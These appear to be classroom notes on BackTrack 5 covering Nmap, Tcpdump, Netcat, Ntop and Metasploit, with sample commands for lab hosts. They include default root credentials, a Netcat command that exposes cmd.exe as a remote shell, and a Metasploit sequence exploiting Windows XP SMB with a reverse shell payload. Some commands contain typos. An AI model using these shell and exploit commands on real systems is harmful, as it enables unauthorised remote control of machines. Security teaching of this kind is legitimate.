BackTrack 5.
  * root / toor
  * Network not started by default
  * SSHD not started by default

Top 5 Tools
  * Nmap
  * Tcpdump - libpcap
  * nc
  * Ntop
  * Metasploit

Nmap
  * Scans networks for open ports, alive hosts, OS fingerprinting, etc
    - today = scanning + os fingerprinting
  * How to use:

    nmap -v -sT -F -A -oG output.grep 10.x.x.x/24

    -v = increase verbosity of output
    -sT = do a full TCP connection to all ports (NOTE: This is not stealthy!)
    -F = fast scan, only scan ports in /etc/services
    -A = enable os fingerprinting + other features (NOTE: this is also -O, but -A is more full featured)
    -oG = output to greppable format
    
Tcpdump
  * Dumps all traffic seen on a network interface to screen or file
    - today = capture basic packets and do simple analysis
  * How to use:

    tcpdump -i eth0 -n -x

    -i = interface we want to listen to
    -n = turn off /etc/services translation and turn off dns lookup
    -x = dump hex of output to screen

    (Side note: 0x45 = IPv4. 4*5 = 20 bytes in IP header.  Similar for 0x6_)

Netcat:
  * Creates TCP compliant sockets
    - today = we will create a reverse shell for today's demo
  * How to use:

   C:\> nc -l -p 2000 -e cmd.exe
   localhost# nc 172.16.75.1.30 2000

   -l = listen on a port
   -p = port should be X
   -e = when connection is established, execute a command

   This is effectively running Window's cmd.exe across a TCP socket.

Ntop:
  * Slurps up network traffic (like tcpdump) and poops out perdy webpages detailing network traffic information
    - today = screenshots only

  Outputs a webpage similar to what top looks like inspecting network traffic.
  It does have a curses interface.

Metasploit:
  * Turns common vunerabilities into a point-and-click p0wnage fest
    - today = Windows XP SP2 is lulz
  * How to use:
    localhost# msfconsole
    msf> use windows/smb/????_067_netapi
    msf> set rhost 172.16.75.130
    msf> set target 0
    msf> set payload windows/sheel_reverse_tcp
    msf> set lhost 172.16.75.129
    msf> exploit
